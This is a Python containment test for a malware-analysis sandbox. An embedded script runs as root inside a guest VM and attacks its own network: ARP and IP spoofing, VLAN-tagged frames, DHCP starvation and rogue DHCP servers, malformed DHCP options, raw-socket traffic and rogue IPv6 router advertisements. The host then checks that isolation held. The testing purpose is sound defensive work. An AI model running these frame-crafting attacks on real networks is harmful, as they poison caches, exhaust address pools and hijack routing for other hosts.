"""Hostile-guest containment test (goal G3.2): a root process in the Linux guest attacks its own link layer,
then the C1-C6/L1 probes check that containment still holds in the same VM.

    sudo /opt/chimera/venv/bin/python hostile_guest_test.py EVIDENCE_DIR [--vm-id 1]

Inside the guest (root, AF_PACKET / SOCK_RAW, Python stdlib only):
  H1 ARP spoofing: gratuitous ARP for the gateway, ARP replies claiming INetSim's and another VM's address, a
     100-request ARP sweep of 10.13.0.0/16
  H2 MAC spoofing: DNS queries to INetSim from a forged MAC and from the gateway's MAC
  H3 IP spoofing: DNS queries to INetSim from a LAN address, 8.8.8.8, INetSim's own and another VM's address
  H4 802.1Q / 802.1ad: tagged frames (VID 0, 1, 100, and QinQ) carrying UDP to INetSim and the LAN router
  H5 DHCP misuse: 200 DISCOVERs from random MACs (starvation), 10 rogue OFFER/ACKs naming the guest as server,
     router and DNS, 5 DISCOVERs with oversized options and 3 with an option length running past the packet
  H6 raw sockets: IP protocols 47 (GRE), 50 (ESP), 132 (SCTP), 253 and ICMP echo to the LAN router, 8.8.8.8, INetSim
  H7 IPv6 router advertisements to ff02::1 with prefix 2001:db8:dead::/64 and an RDNSS option

On the host: captures on the uplink, the VM bridge and inetsim0; firewall counters, neighbour tables, IPv6
addresses and routes, and the VM's dnsmasq before and after. Needs the vm slot free (stop drakrun-worker@N and
drakrun-evasion-worker@N). Writes EVIDENCE_DIR/{results.json, guest-hostile.json, guest-probes.json, *.pcap,
state-*.txt} and prints the pass table.
"""

import argparse
import json
import pathlib
import subprocess
import sys
import time

from drakrun.analyzer.run_tools import run_vm
from drakrun.lib.config import NetworkConfigSection, load_config
from drakrun.lib.install_info import InstallInfo
from drakrun.lib.linux_agent import LinuxAgent, wait_for_vm_network
from drakrun.lib.networking import get_dnsmasq_pidfile_path, make_network_info_for_vm

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "linux"))
from containment_test import LINUX_GOLDEN_DIR, counters, guest_probes, lan_addresses, sh  # noqa: E402

FORGED_MAC = "02:de:ad:be:ef:01"
# Forged sources: a free address on the host's LAN (.250), 8.8.8.8, INetSim's own, and another VM's
RA_PREFIX = "2001:db8:dead::"

# Runs as root inside the guest. Prints one JSON object: frames sent and errors per test.
GUEST_HOSTILE = r'''
import json, os, random, socket, struct, sys, time
INETSIM, OTHER_VM = "10.99.0.2", sys.argv[1]
FORGED_MAC, RA_PREFIX, ROUTER = sys.argv[2], sys.argv[3], sys.argv[5]
FORGED_SOURCES = sys.argv[4].split(",")

def route():
    for line in open("/proc/net/route").read().splitlines()[1:]:
        f = line.split()
        if f[1] == "00000000":
            return f[0], socket.inet_ntoa(struct.pack("<I", int(f[2], 16)))
iface, gw = route()
mac = open(f"/sys/class/net/{iface}/address").read().strip()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((gw, 9)); ip = s.getsockname()[0]; s.close()

def macb(m): return bytes.fromhex(m.replace(":", ""))
def gw_mac():
    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"x", (gw, 9)); time.sleep(0.5)
    for line in open("/proc/net/arp").read().splitlines()[1:]:
        f = line.split()
        if f[0] == gw:
            return f[3]
GW_MAC = gw_mac()
BCAST = "ff:ff:ff:ff:ff:ff"
raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW); raw.bind((iface, 0))
out = {"iface": iface, "ip": ip, "mac": mac, "gateway": gw, "gateway_mac": GW_MAC}

def csum(b):
    if len(b) % 2: b += b"\0"
    t = sum(struct.unpack(f"!{len(b)//2}H", b)); t = (t >> 16) + (t & 0xffff); t += t >> 16
    return ~t & 0xffff
def eth(dst, src, etype, payload): return macb(dst) + macb(src) + struct.pack("!H", etype) + payload
def ipv4(src, dst, proto, payload):
    h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), random.randint(0, 65535), 0, 64, proto, 0,
                    socket.inet_aton(src), socket.inet_aton(dst))
    return h[:10] + struct.pack("!H", csum(h)) + h[12:] + payload
def udp(sport, dport, payload): return struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload
def arp(op, sha, spa, tha, tpa):
    return struct.pack("!HHBBH", 1, 0x0800, 6, 4, op) + macb(sha) + socket.inet_aton(spa) + macb(tha) + socket.inet_aton(tpa)
DNSQ = bytes.fromhex("beef01000001000000000000") + b"\x07example\x03com\x00\x00\x01\x00\x01"

def send(name, frames):
    sent, errors = 0, []
    for f in frames:
        try:
            raw.send(f); sent += 1
        except OSError as e:
            errors.append(str(e))
        time.sleep(0.005)
    out[name] = {"sent": sent, "errors": sorted(set(errors))[:5]}

# H1 ARP spoofing
frames = [eth(BCAST, mac, 0x0806, arp(2, mac, gw, BCAST, gw)) for _ in range(5)]
frames += [eth(GW_MAC, mac, 0x0806, arp(2, mac, t, GW_MAC, gw)) for t in (INETSIM, OTHER_VM) for _ in range(5)]
frames += [eth(BCAST, mac, 0x0806, arp(1, mac, ip, "00:00:00:00:00:00",
                                       f"10.13.{random.randint(0, 255)}.{random.randint(1, 254)}")) for _ in range(100)]
send("H1_arp_spoof", frames)
# H2 MAC spoofing (correct source IP, UDP source port 40000)
q = ipv4(ip, INETSIM, 17, udp(40000, 53, DNSQ))
send("H2_mac_spoof", [eth(GW_MAC, FORGED_MAC, 0x0800, q)] * 4 + [eth(GW_MAC, GW_MAC, 0x0800, q)] * 4)
# H3 IP spoofing
send("H3_ip_spoof", [eth(GW_MAC, mac, 0x0800, ipv4(src, INETSIM, 17, udp(40001, 53, DNSQ)))
                     for src in FORGED_SOURCES + [OTHER_VM] for _ in range(4)])
# H4 802.1Q and 802.1ad (inner UDP source ports 40002/40003; 40004 for VID 0, a priority tag that Linux takes as
# untagged, so those frames are told apart from real VLAN traffic)
frames = []
for vid in (0, 1, 100):
    for dst in (INETSIM, ROUTER):
        sport = 40004 if vid == 0 else 40002
        frames.append(eth(GW_MAC, mac, 0x8100, struct.pack("!HH", vid, 0x0800) + ipv4(ip, dst, 17, udp(sport, 53, DNSQ))))
frames.append(eth(GW_MAC, mac, 0x88a8, struct.pack("!HHHH", 100, 0x8100, 1, 0x0800) + ipv4(ip, ROUTER, 17, udp(40003, 53, DNSQ))))
send("H4_vlan", [f for f in frames for _ in range(3)])
# H5 DHCP misuse
def dhcp(op, chaddr, msgtype, options=b"", yiaddr="0.0.0.0", siaddr="0.0.0.0"):
    body = struct.pack("!BBBBIHH4s4s4s4s", op, 1, 6, 0, random.getrandbits(32), 0, 0x8000, b"\0" * 4,
                       socket.inet_aton(yiaddr), socket.inet_aton(siaddr), b"\0" * 4)
    body += macb(chaddr) + b"\0" * 10 + b"\0" * 192 + bytes.fromhex("63825363")
    return body + bytes([53, 1, msgtype]) + options
def rand_mac(): return "02:" + ":".join(f"{random.randint(0, 255):02x}" for _ in range(5))
starve = []
for _ in range(200):
    m = rand_mac()
    starve.append(eth(BCAST, m, 0x0800, ipv4("0.0.0.0", "255.255.255.255", 17, udp(68, 67, dhcp(1, m, 1, b"\xff")))))
send("H5a_dhcp_starvation", starve)
rogue = bytes([54, 4]) + socket.inet_aton(ip) + bytes([3, 4]) + socket.inet_aton(ip) + bytes([6, 4]) + socket.inet_aton(ip) \
    + bytes([51, 4]) + struct.pack("!I", 86400) + b"\xff"
send("H5b_dhcp_rogue_server", [eth(BCAST, mac, 0x0800, ipv4(ip, "255.255.255.255", 17,
     udp(67, 68, dhcp(2, rand_mac(), t, rogue, yiaddr=ip, siaddr=ip)))) for t in (2, 5) for _ in range(5)])
big = b"".join(bytes([code, 255]) + bytes([0x41]) * 255 for code in (60, 12, 77, 43, 125)) + b"\xff"
trunc = bytes([12, 255]) + b"B" * 20  # length runs past the end of the packet
send("H5c_dhcp_oversized_options", [eth(BCAST, mac, 0x0800, ipv4("0.0.0.0", "255.255.255.255", 17,
     udp(68, 67, dhcp(1, mac, 1, big)))) for _ in range(5)]
     + [eth(BCAST, mac, 0x0800, ipv4("0.0.0.0", "255.255.255.255", 17, udp(68, 67, dhcp(1, mac, 1, trunc)))) for _ in range(3)])
# H6 raw sockets
res = {}
for proto in (47, 50, 132, 253):
    try:
        r = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
        for dst in (ROUTER, "8.8.8.8", INETSIM):
            r.sendto(os.urandom(48), (dst, 0))
        res[str(proto)] = "sent 3"
        r.close()
    except OSError as e:
        res[str(proto)] = str(e)
icmp_replies = {}
for dst in (ROUTER, "8.8.8.8", INETSIM):
    r = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP); r.settimeout(2)
    pkt = struct.pack("!BBHHH", 8, 0, 0, 0x1234, 1) + b"chimera"
    pkt = pkt[:2] + struct.pack("!H", csum(pkt)) + pkt[4:]
    r.sendto(pkt, (dst, 0))
    try:
        data, addr = r.recvfrom(1024); icmp_replies[dst] = addr[0]
    except socket.timeout:
        icmp_replies[dst] = None
    r.close()
out["H6_raw_sockets"] = {"protocols": res, "icmp_echo_reply_from": icmp_replies}
# H7 IPv6 router advertisement
ll = None
for line in open("/proc/net/if_inet6"):
    f = line.split()
    if f[5] == iface and f[0].startswith("fe80"):
        ll = bytes.fromhex(f[0])
if ll is None:
    out["H7_ipv6_ra"] = {"sent": 0, "errors": ["no link-local address"]}
else:
    dst = socket.inet_pton(socket.AF_INET6, "ff02::1")
    opts = bytes([1, 1]) + macb(mac)
    opts += struct.pack("!BBBBIII", 3, 4, 64, 0xC0, 86400, 14400, 0) + socket.inet_pton(socket.AF_INET6, RA_PREFIX)
    opts += struct.pack("!BBHI", 25, 3, 0, 1800) + socket.inet_pton(socket.AF_INET6, RA_PREFIX + "53")
    ra = struct.pack("!BBHBBHII", 134, 0, 0, 64, 0, 1800, 0, 0) + opts
    pseudo = ll + dst + struct.pack("!I3xB", len(ra), 58)
    ra = ra[:2] + struct.pack("!H", csum(pseudo + ra)) + ra[4:]
    ip6 = struct.pack("!IHBB", 0x60000000, len(ra), 58, 255) + ll + dst
    send("H7_ipv6_ra", [eth("33:33:00:00:00:01", mac, 0x86DD, ip6 + ra)] * 10)
print(json.dumps(out))
'''


def state(path: pathlib.Path, bridge: str) -> dict:
    text = sh(
        f"echo '## neigh'; ip neigh show; echo '## ip6 addr'; ip -6 addr show; echo '## ip6 route'; ip -6 route show;"
        f" echo '## ip4 route'; ip -4 route show; echo '## accept_ra'; sysctl net.ipv6.conf.{bridge}.accept_ra;"
        " echo '## raw'; iptables -t raw -L CHIMERA_RAW -v -x -n"
    )
    path.write_text(text)
    rpfilter = 0
    for line in text.split("## raw", 1)[1].splitlines():
        if "rpfilter" in line and line.split() and line.split()[0].isdigit():
            rpfilter = int(line.split()[0])
    return {
        "neigh": sorted(line for line in sh("ip neigh show").splitlines() if line.strip()),
        "ip6_addr": sorted(sh("ip -6 -o addr show | awk '{print $2, $4}'").split("\n")),
        "ip6_route": sorted(sh("ip -6 route show").split("\n")),
        "rpfilter_drops": rpfilter,
    }


def pcap_count(path: pathlib.Path, bpf: str = "") -> int:
    return int(sh(f"tcpdump -r {path} -n {bpf} 2>/dev/null | wc -l").strip() or 0)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("evidence_dir", type=pathlib.Path)
    ap.add_argument("--vm-id", type=int, default=1)
    ap.add_argument("--uplink", default="wlp0s20f3")
    args = ap.parse_args()
    ev = args.evidence_dir
    ev.mkdir(parents=True, exist_ok=True)

    config = load_config()
    install_info = InstallInfo.load(LINUX_GOLDEN_DIR / "install.json")
    network_conf = NetworkConfigSection(out_interface=config.network.out_interface,
                                        dns_server=config.network.dns_server, net_enable=True)
    net = make_network_info_for_vm(args.vm_id, network_conf)
    other_vm = str(make_network_info_for_vm(args.vm_id + 1, network_conf).vm_address)
    results = {"C0_net_check_before": subprocess.run(["chimera-net-check", "--require-inetsim"],
                                                     capture_output=True, text=True).returncode == 0}
    before_counters = counters(ev / "counters-before.txt")
    router, host_ip = lan_addresses(args.uplink)
    lan_forged = router.rsplit(".", 1)[0] + ".250"
    forged = ",".join((lan_forged, "8.8.8.8", "10.99.0.2"))
    results.update(lan_router=router, host_lan_ip=host_ip, lan_forged_source=lan_forged)
    # Anything the attacks could have pushed onto the LAN: forged MACs and sources, the guest subnets, the RA
    # prefix, the raw protocols, tagged frames. VLAN last: it shifts the offsets of what follows in BPF.
    uplink_bpf = (f"ether src {FORGED_MAC} or net 10.13.0.0/16 or host {lan_forged} or host 10.99.0.2"
                  f" or ip6 net {RA_PREFIX}/48 or ip proto 47 or ip proto 50 or ip proto 132 or ip proto 253 or vlan")
    captures = []
    try:
        started = time.monotonic()
        with run_vm(args.vm_id, install_info, network_conf) as vm:
            results["restore_s"] = round(time.monotonic() - started, 2)
            dnsmasq_pid = pathlib.Path(get_dnsmasq_pidfile_path(args.vm_id)).read_text().strip()
            before = state(ev / "state-before.txt", net.bridge_name)
            for name, iface, bpf in (("uplink", args.uplink, uplink_bpf), ("bridge", net.bridge_name, ""),
                                     ("inetsim0", "inetsim0", "")):
                cmd = ["tcpdump", "-i", iface, "-n", "-U", "-w", str(ev / f"{name}.pcap")] + ([bpf] if bpf else [])
                captures.append(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            time.sleep(2)
            agent = LinuxAgent(f"/var/run/drakrun/{vm.vm_name}.sock")
            try:
                agent.wait_ready(60)
                results["guest_net"] = wait_for_vm_network(agent, args.vm_id)
                script = "python3 - " + " ".join([other_vm, FORGED_MAC, RA_PREFIX, forged, router])
                hostile = agent.call("sh", {"cmd": f"{script} <<'EOF'\n{GUEST_HOSTILE}EOF\n", "timeout": 240},
                                     timeout=260)
                (ev / "guest-hostile.json").write_text(json.dumps(hostile, indent=1))
                time.sleep(5)
                probes = agent.call("sh", {"cmd": "python3 - <<'EOF'\n" + guest_probes(router, host_ip) + "EOF\n", "timeout": 150},
                                    timeout=170)
                (ev / "guest-probes.json").write_text(json.dumps(probes, indent=1))
            finally:
                agent.close()
            after = state(ev / "state-after.txt", net.bridge_name)
            results["dnsmasq_same_pid_alive"] = (
                pathlib.Path(get_dnsmasq_pidfile_path(args.vm_id)).read_text().strip() == dnsmasq_pid
                and pathlib.Path(f"/proc/{dnsmasq_pid}").exists()
            )
    finally:
        time.sleep(2)
        for capture in captures:
            capture.terminate()
            capture.wait(10)
    after_counters = counters(ev / "counters-after.txt")
    guest = json.loads(hostile["stdout"].strip().splitlines()[-1])
    probe = json.loads(probes["stdout"].strip().splitlines()[-1])
    inetsim = ev / "inetsim0.pcap"

    def http_inetsim(entry):
        return entry.get("status") == 200 and entry.get("inetsim") is True

    results.update(
        guest=guest, probes=probe, counters_before=before_counters, counters_after=after_counters,
        state_before=before, state_after=after,
        new_neighbours=sorted(set(after["neigh"]) - set(before["neigh"])),
        uplink_frames=pcap_count(ev / "uplink.pcap"),
        bridge_frames=pcap_count(ev / "bridge.pcap"),
        # Informational: dom0 routes by IP, so forged-MAC frames with the guest's own address reach INetSim
        h2_forwarded_to_inetsim=pcap_count(inetsim, "udp src port 40000"),
        h3_forged_sources_on_inetsim0=pcap_count(inetsim, f"udp src port 40001 and not src host {guest['ip']}"),
        # Informational: VID 0 is a priority tag, not a VLAN (IEEE 802.1Q); Linux takes it as untagged
        h4_priority_tagged_on_inetsim0=pcap_count(inetsim, "udp src port 40004"),
        h4_tagged_payload_on_inetsim0=pcap_count(inetsim, "udp src port 40002 or udp src port 40003 or vlan"),
    )
    results["C0_net_check_after"] = subprocess.run(["chimera-net-check", "--require-inetsim"],
                                                   capture_output=True, text=True).returncode == 0
    results["pass"] = {
        "uplink_clean": results["uplink_frames"] == 0,
        # No dom0 neighbour entry other than the guest's own address points at the guest's MAC
        "H1_H2_no_poisoned_neighbour": not any(
            guest["mac"] in line and not line.startswith(guest["ip"] + " ") for line in after["neigh"]
        ),
        "H3_spoofed_sources_dropped": results["h3_forged_sources_on_inetsim0"] == 0
        and after["rpfilter_drops"] > before["rpfilter_drops"],
        "H4_tagged_frames_not_forwarded": results["h4_tagged_payload_on_inetsim0"] == 0,
        "H5_dnsmasq_survived": results["dnsmasq_same_pid_alive"],
        "H5_H7_dom0_ipv6_routes_unchanged": before["ip6_route"] == after["ip6_route"],
        "H7_no_ra_address_on_dom0": before["ip6_addr"] == after["ip6_addr"],
        "C0": results["C0_net_check_before"] and results["C0_net_check_after"],
        "C1_after": probe["C1_dns_example_com"] == "10.99.0.2",
        "C2_after": http_inetsim(probe["C2_http_by_name"]),
        "C3_after": http_inetsim(probe["C3_http_direct_ip"]),
        "C4_after": http_inetsim(probe["C4_lan_router_http"]),
        "C5_after": not any(probe[f"C5_dom0_{p}"]["connected"] for p in (22, 5000, 6379, 7070)),
        "C6_after": not probe["C6_ipv6_all_nodes"]["reply"] and not probe["C6_ipv6_global"]["reply"],
        "L1_after": not probe["L1_host_lan_ssh"].get("banner", "").startswith("SSH-"),
    }
    results["all_pass"] = all(results["pass"].values())
    (ev / "results.json").write_text(json.dumps(results, indent=1))
    print(json.dumps(results["pass"], indent=1), "all_pass:", results["all_pass"])


if __name__ == "__main__":
    main()
